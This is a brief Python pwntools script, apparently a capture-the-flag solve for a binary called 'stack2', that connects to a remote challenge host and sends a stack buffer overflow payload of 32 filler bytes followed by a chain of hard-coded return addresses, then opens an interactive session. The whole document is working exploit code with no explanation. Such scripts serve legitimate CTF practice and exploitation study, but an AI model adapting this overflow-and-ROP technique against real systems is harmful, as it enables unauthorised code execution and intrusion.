from pwn import *

# p = process("./stack2")
p = remote("rev.danissimurr.ru", 1341)
p.sendline(b'A'*32 + p64(0x4011ec) + p64(0x4011d8) + p64(0x4011ed) + p64(0x401196))
p.interactive()